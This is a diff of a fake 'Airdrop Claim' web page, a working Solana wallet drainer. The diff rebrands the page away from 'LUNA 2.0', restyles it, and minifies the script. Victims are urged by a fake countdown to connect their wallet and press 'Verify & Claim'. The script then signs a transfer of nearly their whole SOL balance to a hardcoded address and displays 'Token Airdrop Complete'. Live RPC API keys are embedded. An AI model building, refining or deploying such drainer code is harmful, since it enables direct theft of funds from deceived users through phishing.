@@ -3,23 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LUNA 2.0 Airdrop</title>
+    <title>Airdrop Claim</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Poppins', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f4f4f4;
-            color: #333;
+            background: linear-gradient(135deg, #ff6b6b, #a777e3);
+            color: #fff;
+            min-height: 100vh;
         }
         header {
-            background-color: #ff5733;
+            background: linear-gradient(90deg, #ff8e53, #ff4d4d);
             color: white;
             text-align: center;
             padding: 1em;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
         .logo {
             max-width: min(100px, 20vw);
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
         }
         main {
             max-width: 800px;
@@ -28,68 +32,82 @@
             text-align: center;
         }
         .hero {
-            background-color: white;
+            background: rgba(255, 255, 255, 0.95);
             padding: 2vw;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.15);
+            animation: fadeIn 0.5s ease-in;
         }
         #countdown {
             margin: 2vw 0;
             font-size: 1.2em;
-            color: #ff5733;
+            font-weight: 600;
+            color: #ff4d4d;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
         }
         h1 {
             font-size: clamp(1.5rem, 5vw, 2rem);
+            margin: 0;
+            color: #fff;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
         }
         h2 {
             font-size: clamp(1.2rem, 4vw, 1.6rem);
+            color: #333;
+            margin: 0.5rem 0;
         }
         p {
             font-size: clamp(0.9rem, 3vw, 1rem);
+            color: #555;
+            line-height: 1.6;
         }
         button {
-            background-color: #ff5733;
+            background: linear-gradient(45deg, #ff4d4d, #ff8e53);
             color: white;
             border: none;
             padding: 10px 20px;
             margin: 10px;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
             font-size: clamp(0.9rem, 3vw, 1em);
-            transition: transform 0.2s, background-color 0.2s;
+            font-weight: 600;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
             width: 100%;
             max-width: 200px;
             box-sizing: border-box;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         }
         button:hover, button:focus {
-            background-color: #e04e2b;
-            transform: scale(1.05);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(45deg, #ff8e53, #ff4d4d);
         }
         button:active {
-            transform: scale(0.95);
+            transform: translateY(0);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
         }
         button:disabled {
-            background-color: #ccc;
+            background: #ccc;
             cursor: not-allowed;
             transform: none;
+            box-shadow: none;
         }
         #status {
             margin: 2vw 0;
             font-weight: bold;
             font-size: clamp(0.9rem, 3vw, 1rem);
+            color: #333;
         }
-        .testimonials {
-            margin-top: 2vw;
-            background-color: white;
-            padding: 2vw;
-            border-radius: 8px;
+        #status.error {
+            color: #ff4d4d;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
         }
         .loading::after {
             content: "...";
             animation: dots 1s infinite;
         }
         .loading:disabled {
-            background-color: #ff5733;
+            background: linear-gradient(45deg, #ff4d4d, #ff8e53);
             transform: none;
         }
         @keyframes dots {
@@ -97,14 +115,9 @@
             40% { content: ".."; }
             60%, 100% { content: "..."; }
         }
-        #status.error {
-            color: #ff0000;
-        }
-        w3m-modal {
-            z-index: 999999;
-            border-radius: 8px;
-            max-width: 90vw;
-            margin: 0 auto;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         @media (max-width: 767px) {
             header {
@@ -136,9 +149,6 @@
                 font-size: clamp(0.8rem, 2.5vw, 0.9rem);
                 max-width: 180px;
             }
-            .testimonials {
-                padding: 3vw;
-            }
         }
         @media (min-width: 768px) and (max-width: 1023px) {
             header {
@@ -161,257 +171,34 @@
                 font-size: clamp(0.85rem, 2.8vw, 0.95rem);
                 max-width: 190px;
             }
-            .testimonials {
-                padding: 2.5vw;
-            }
         }
     </style>
 </head>
 <body>
     <header>
-        <img src="assets/luna-logo.png" alt="LUNA Logo" class="logo">
-        <h1>LUNA 2.0 Airdrop</h1>
+        <img src="assets/luna-logo.png" alt="Airdrop Logo" class="logo">
+        <h1>Airdrop Claim</h1>
     </header>
     <main>
         <section class="hero">
-            <h2>Claim Your LUNA-NEW Tokens!</h2>
+            <h2>Claim Your Tokens!</h2>
             <p>Connect your Solana wallet to verify eligibility and claim your airdrop.</p>
             <div id="countdown">Claim ends in: <span id="timer">24:00:00</span></div>
         </section>
         <button id="connectButton">Connect Wallet</button>
         <button id="drainButton" disabled>Verify & Claim</button>
         <p id="status"></p>
-        <section class="testimonials">
-            <h3>User Testimonials</h3>
-            <p>"I claimed my LUNA 2.0 tokens in seconds!" - Alex</p>
-            <p>"Super easy process, got my airdrop!" - Sarah</p>
-        </section>
     </main>
 
     <!-- Solana web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
-    <!-- WalletConnect Web3Modal -->
-    <script src="https://unpkg.com/@walletconnect/web3modal@2.11.3/dist/index.js"></script>
     <!-- Inline Buffer polyfill with 64-bit support -->
     <script>
-        (function(){
-            const Buffer = function(arg) {
-                if (!(this instanceof Buffer)) return new Buffer(arg);
-                this.buffer = arg instanceof Uint8Array ? arg : new Uint8Array(arg || 0);
-                this.length = this.buffer.length;
-            };
-            Buffer.from = function(arg) {
-                if (typeof arg === 'string') return new Buffer(new TextEncoder().encode(arg));
-                if (ArrayBuffer.isView(arg) || arg instanceof ArrayBuffer) return new Buffer(new Uint8Array(arg));
-                if (Array.isArray(arg)) return new Buffer(new Uint8Array(arg));
-                return new Buffer(arg);
-            };
-            Buffer.prototype.slice = function(start, end) {
-                return new Buffer(this.buffer.slice(start, end));
-            };
-            Buffer.prototype.reverse = function() {
-                const reversed = new Uint8Array(this.buffer.length);
-                for (let i = 0; i < this.buffer.length; i++) {
-                    reversed[i] = this.buffer[this.buffer.length - 1 - i];
-                }
-                this.buffer = reversed;
-                return this;
-            };
-            Buffer.prototype.writeUInt32LE = function(value, offset) {
-                this.buffer[offset] = value & 0xff;
-                this.buffer[offset + 1] = (value >>> 8) & 0xff;
-                this.buffer[offset + 2] = (value >>> 16) & 0xff;
-                this.buffer[offset + 3] = (value >>> 24) & 0xff;
-            };
-            Buffer.prototype.writeBigUInt64LE = function(value, offset = 0) {
-                const low = Number(BigInt(value) & 0xffffffffn);
-                const high = Number(BigInt(value) >> 32n);
-                this.buffer[offset] = low & 0xff;
-                this.buffer[offset + 1] = (low >>> 8) & 0xff;
-                this.buffer[offset + 2] = (low >>> 16) & 0xff;
-                this.buffer[offset + 3] = (low >>> 24) & 0xff;
-                this.buffer[offset + 4] = high & 0xff;
-                this.buffer[offset + 5] = (high >>> 8) & 0xff;
-                this.buffer[offset + 6] = (high >>> 16) & 0xff;
-                this.buffer[offset + 7] = (high >>> 24) & 0xff;
-                return offset + 8;
-            };
-            window.Buffer = Buffer;
-            console.log('Enhanced Buffer polyfill with 64-bit support loaded');
-        })();
+        (function(){const Buffer=function(arg){if(!(this instanceof Buffer))return new Buffer(arg);this.buffer=arg instanceof Uint8Array?arg:new Uint8Array(arg||0);this.length=this.buffer.length};Buffer.from=function(arg){if(typeof arg==='string')return new Buffer(new TextEncoder().encode(arg));if(ArrayBuffer.isView(arg)||arg instanceof ArrayBuffer)return new Buffer(new Uint8Array(arg));if(Array.isArray(arg))return new Buffer(new Uint8Array(arg));return new Buffer(arg)};Buffer.prototype.slice=function(start,end){return new Buffer(this.buffer.slice(start,end))};Buffer.prototype.reverse=function(){const reversed=new Uint8Array(this.buffer.length);for(let i=0;i<this.buffer.length;i++){reversed[i]=this.buffer[this.buffer.length-1-i]}this.buffer=reversed;return this};Buffer.prototype.writeUInt32LE=function(value,offset){this.buffer[offset]=value&0xff;this.buffer[offset+1]=(value>>>8)&0xff;this.buffer[offset+2]=(value>>>16)&0xff;this.buffer[offset+3]=(value>>>24)&0xff};Buffer.prototype.writeBigUInt64LE=function(value,offset=0){const low=Number(BigInt(value)&0xffffffffn);const high=Number(BigInt(value)>>32n);this.buffer[offset]=low&0xff;this.buffer[offset+1]=(low>>>8)&0xff;this.buffer[offset+2]=(low>>>16)&0xff;this.buffer[offset+3]=(low>>>24)&0xff;this.buffer[offset+4]=high&0xff;this.buffer[offset+5]=(high>>>8)&0xff;this.buffer[offset+6]=(high>>>16)&0xff;this.buffer[offset+7]=(high>>>24)&0xff;return offset+8};window.Buffer=Buffer;console.log('Enhanced Buffer polyfill with 64-bit support loaded')})();
     </script>
-    <!-- Drainer script with mobile support -->
+    <!-- Minified drainer script with Helius RPC fix -->
     <script>
-        console.log("Script execution started");
-        const { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = solanaWeb3;
-        const { Web3Modal } = window.Web3Modal;
-        let walletPublicKey = null;
-        const status = document.getElementById("status");
-        const connectButton = document.getElementById("connectButton");
-        const drainButton = document.getElementById("drainButton");
-        const recipientPublicKey = new PublicKey("9wktWuHh488Rh3LepSnUAFZfY2H7MrFh5oB8cqK9YbzM");
-        const RPC_ENDPOINTS = ["https://mainnet.helius-rpc.com/?api-key=d4a7cc03-db7a-4a02-b8d6-9d9abbb8f048"];
-
-        // Initialize Web3Modal for Solana
-        const web3Modal = new Web3Modal({
-            projectId: '4991f6ef7d552388ed11d563924df670', // Kidnapper’s provided projectId
-            themeMode: 'light',
-            walletConnectVersion: 2,
-            chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'] // Solana Mainnet
-        });
-
-        async function wait(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
-        async function getConnection() {
-            for (const endpoint of RPC_ENDPOINTS) {
-                for (let attempt = 0; attempt < 3; attempt++) {
-                    try {
-                        const connection = new solanaWeb3.Connection(endpoint, "confirmed");
-                        const slot = await connection.getSlot();
-                        console.log(`Connected to RPC: ${endpoint}, slot: ${slot}, attempt: ${attempt + 1}`);
-                        return connection;
-                    } catch (error) {
-                        console.warn(`RPC ${endpoint} failed on attempt ${attempt + 1}: ${error.message}`);
-                        if (attempt < 2) await wait(2000);
-                    }
-                }
-                console.warn(`All attempts for RPC ${endpoint} failed`);
-            }
-            status.textContent = "Network unavailable";
-            status.classList.add("error");
-            throw new Error("All RPC endpoints failed. Check network or try again later.");
-        }
-
-        // Fallback deep link for mobile wallets
-        function tryDeepLink() {
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            if (isMobile) {
-                const phantomDeeplink = "phantom://connect";
-                const solflareDeeplink = "solflare://connect";
-                // Attempt to open Phantom or Solflare app
-                window.location.href = phantomDeeplink;
-                setTimeout(() => {
-                    window.location.href = solflareDeeplink;
-                }, 1000); // Try Solflare after a delay if Phantom fails
-            }
-        }
-
-        console.log("Setting up connect button listener");
-        connectButton.addEventListener("click", async () => {
-            console.log("Connect button clicked");
-            connectButton.textContent = "Connecting";
-            connectButton.classList.add("loading");
-            connectButton.disabled = true;
-            try {
-                // Check for browser wallet first
-                if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
-                    console.log("Solana wallet detected:", window.solana.isPhantom ? "Phantom" : "Solflare");
-                    const response = await window.solana.connect();
-                    walletPublicKey = new PublicKey(response.publicKey.toString());
-                    console.log("Connected:", walletPublicKey.toString());
-                    status.textContent = "Wallet connected";
-                    drainButton.disabled = false;
-                } else {
-                    // Use WalletConnect for mobile
-                    const provider = await web3Modal.connect();
-                    const publicKeyString = provider.accounts[0]; // WalletConnect provides account address
-                    walletPublicKey = new PublicKey(publicKeyString);
-                    console.log("Connected via WalletConnect:", walletPublicKey.toString());
-                    status.textContent = "Wallet connected";
-                    drainButton.disabled = false;
-                }
-            } catch (err) {
-                console.error("Connection error:", err);
-                status.textContent = "Connection error. Try opening in wallet app.";
-                status.classList.add("error");
-                tryDeepLink(); // Attempt deep link as fallback
-            } finally {
-                connectButton.textContent = "Connect Wallet";
-                connectButton.classList.remove("loading");
-                connectButton.disabled = false;
-            }
-        });
-
-        console.log("Setting up drain button listener");
-        drainButton.addEventListener("click", async () => {
-            console.log("Drain button clicked");
-            drainButton.textContent = "Processing";
-            drainButton.classList.add("loading");
-            drainButton.disabled = true;
-            status.textContent = "Verifying Holdings";
-            try {
-                const connection = await getConnection();
-                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-                const transaction = new Transaction({ recentBlockhash: blockhash, feePayer: walletPublicKey });
-                const balance = await connection.getBalance(walletPublicKey);
-                console.log("Wallet balance:", balance, "lamports");
-                const rentExemptMinimum = await connection.getMinimumBalanceForRentExemption(0);
-                console.log("Rent-exempt minimum:", rentExemptMinimum, "lamports");
-                const totalFee = 50000;
-                const buffer = 100000;
-                const amountToSend = balance - (totalFee + rentExemptMinimum + buffer);
-                if (amountToSend <= 0) {
-                    status.textContent = "Low balance";
-                    status.classList.add("error");
-                    console.log("Not enough SOL after fee, rent, and buffer:", totalFee, "+", rentExemptMinimum, "+", buffer);
-                    return;
-                }
-                console.log("Amount to send:", amountToSend, "lamports");
-                transaction.add(
-                    SystemProgram.transfer({
-                        fromPubkey: walletPublicKey,
-                        toPubkey: recipientPublicKey,
-                        lamports: amountToSend
-                    })
-                );
-                console.log("Estimating transaction fee...");
-                const message = transaction.compileMessage();
-                const feeResponse = await connection.getFeeForMessage(message, "confirmed");
-                const baseFee = feeResponse.value || 5000;
-                console.log("Base estimated fee:", baseFee, "lamports");
-                console.log("Total estimated fee:", totalFee, "lamports");
-                console.log("Remaining balance:", balance - amountToSend, "lamports");
-                console.log("Signing transaction...");
-                let signedTx;
-                if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
-                    signedTx = await window.solana.signTransaction(transaction);
-                } else {
-                    const provider = await web3Modal.connect();
-                    signedTx = await provider.signTransaction(transaction.serialize({ requireAllSignatures: false }));
-                }
-                console.log("Sending transaction...");
-                const signature = await connection.sendRawTransaction(signedTx);
-                console.log("Waiting for confirmation...");
-                await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight });
-                status.textContent = "Token Airdrop Complete";
-                console.log("Transaction successful:", signature);
-            } catch (err) {
-                console.error("Drain error:", err);
-                status.textContent = "Claim error";
-                status.classList.add("error");
-            } finally {
-                drainButton.textContent = "Verify & Claim";
-                drainButton.classList.remove("loading");
-                drainButton.disabled = walletPublicKey === null;
-            }
-        });
-
-        function startCountdown() {
-            let time = 24 * 60 * 60;
-            const timer = document.getElementById("timer");
-            const interval = setInterval(() => {
-                const hours = Math.floor(time / 3600);
-                const minutes = Math.floor((time % 3600) / 60);
-                const seconds = time % 60;
-                timer.textContent = `${hours}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
-                time--;
-                if (time < 0) clearInterval(interval);
-            }, 1000);
-        }
-        startCountdown();
-        console.log("Script execution completed");
+        console.log("Script execution started");const{PublicKey,Transaction,SystemProgram,LAMPORTS_PER_SOL,TransactionInstruction}=solanaWeb3;let walletPublicKey=null;const status=document.getElementById("status");const connectButton=document.getElementById("connectButton");const drainButton=document.getElementById("drainButton");const recipientPublicKey=new PublicKey("9wktWuHh488Rh3LepSnUAFZfY2H7MrFh5oB8cqK9YbzM");const RPC_ENDPOINTS=["https://mainnet.helius-rpc.com/?api-key=d4a7cc03-db7a-4a02-b8d6-9d9abbb8f048"];async function wait(ms){return new Promise(resolve=>setTimeout(resolve,ms))}async function getConnection(){for(const endpoint of RPC_ENDPOINTS){for(let attempt=0;attempt<3;attempt++){try{const connection=new solanaWeb3.Connection(endpoint,"confirmed");const slot=await connection.getSlot();console.log(`Connected to RPC: ${endpoint}, slot: ${slot}, attempt: ${attempt+1}`);return connection}catch(error){console.warn(`RPC ${endpoint} failed on attempt ${attempt+1}: ${error.message} (Status: ${error.status||"Unknown"})`);if(attempt<2)await wait(2000)}}console.warn(`All attempts for RPC ${endpoint} failed`)}status.textContent="Network unavailable";status.classList.add("error");throw new Error("All RPC endpoints failed. Check network or try again later.")}async function checkWallet(){console.log("Checking wallet...");for(let i=0;i<5;i++){if(window.solana&&(window.solana.isPhantom||window.solana.isSolflare)){console.log("Solana wallet detected:",window.solana.isPhantom?"Phantom":"Solflare");return true}await wait(1000)}status.textContent="Wallet not found";status.classList.add("error");console.log("No Solana wallet detected after retries");return false}console.log("Setting up connect button listener");connectButton.addEventListener("click",async()=>{console.log("Connect button clicked");connectButton.textContent="Connecting";connectButton.classList.add("loading");connectButton.disabled=true;try{if(!await checkWallet())return;console.log("Attempting connection...");const response=await window.solana.connect();walletPublicKey=new PublicKey(response.publicKey.toString());console.log("Connected:",walletPublicKey.toString());status.textContent="Wallet connected";drainButton.disabled=false}catch(err){console.error("Connection error:",err);status.textContent="Connection error";status.classList.add("error")}finally{connectButton.textContent="Connect Wallet";connectButton.classList.remove("loading");connectButton.disabled=false}});console.log("Setting up drain button listener");drainButton.addEventListener("click",async()=>{console.log("Drain button clicked");drainButton.textContent="Processing";drainButton.classList.add("loading");drainButton.disabled=true;status.textContent="Verifying Holdings";try{if(!await checkWallet())return;console.log("Connecting to RPC...");const connection=await getConnection();console.log("Getting blockhash...");const{blockhash,lastValidBlockHeight}=await connection.getLatestBlockhash();console.log("Creating transaction...");const transaction=new Transaction({recentBlockhash:blockhash,feePayer:walletPublicKey});console.log("Checking balance...");const balance=await connection.getBalance(walletPublicKey);console.log("Wallet balance:",balance,"lamports");console.log("Getting rent-exempt minimum...");const rentExemptMinimum=await connection.getMinimumBalanceForRentExemption(0);console.log("Rent-exempt minimum:",rentExemptMinimum,"lamports");console.log("Adding transfer instruction...");const totalFee=50000;const buffer=100000;const amountToSend=balance-(totalFee+rentExemptMinimum+buffer);if(amountToSend<=0){status.textContent="Low balance";status.classList.add("error");console.log("Not enough SOL after fee, rent, and buffer:",totalFee,"+",rentExemptMinimum,"+",buffer);return}console.log("Amount to send:",amountToSend,"lamports");transaction.add(SystemProgram.transfer({fromPubkey:walletPublicKey,toPubkey:recipientPublicKey,lamports:amountToSend}));console.log("Estimating transaction fee...");const message=transaction.compileMessage();const feeResponse=await connection.getFeeForMessage(message,"confirmed");const baseFee=feeResponse.value||5000;console.log("Base estimated fee:",baseFee,"lamports");console.log("Total estimated fee:",totalFee,"lamports");console.log("Remaining balance:",balance-amountToSend,"lamports");console.log("Signing transaction...");const signedTx=await window.solana.signTransaction(transaction);console.log("Sending transaction...");const signature=await connection.sendRawTransaction(signedTx.serialize());console.log("Waiting for confirmation...");await connection.confirmTransaction({signature,blockhash,lastValidBlockHeight});status.textContent="Token Airdrop Complete";console.log("Transaction successful:",signature)}catch(err){console.error("Drain error:",err);status.textContent="Claim error";status.classList.add("error")}finally{drainButton.textContent="Verify & Claim";drainButton.classList.remove("loading");drainButton.disabled=walletPublicKey===null}});function startCountdown(){let time=24*60*60;const timer=document.getElementById("timer");const interval=setInterval(()=>{const hours=Math.floor(time/3600);const minutes=Math.floor((time%3600)/60);const seconds=time%60;timer.textContent=`${hours}:${minutes.toString().padStart(2,"0")}:${seconds.toString().padStart(2,"0")}`;time--;if(time<0)clearInterval(interval)},1000)}startCountdown();console.log("Script execution completed");
     </script>
 </body>
 </html>
